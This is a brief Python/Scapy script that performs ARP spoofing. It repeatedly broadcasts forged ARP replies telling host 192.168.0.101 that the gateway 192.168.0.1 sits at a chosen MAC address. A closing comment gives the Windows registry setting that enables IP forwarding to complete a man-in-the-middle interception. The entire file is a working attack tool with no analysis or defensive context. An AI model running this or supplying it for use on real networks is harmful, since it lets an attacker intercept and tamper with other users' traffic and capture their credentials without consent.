from scapy.all import Ether, ARP, sendp

eth = Ether()
arp = ARP(
    op = "is-at",

    # hwsrc = '10:02:b5:c9:24:67',
    hwsrc = 'D0:17:C2:09:A9:25',
    psrc = '192.168.0.1',

    hwdst = '40:4e:36:e0:38:b6',
    pdst = '192.168.0.101'
)

print((eth / arp).show())
sendp(eth / arp, inter = 1, loop = 1)

# HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters IPEnableRouter->1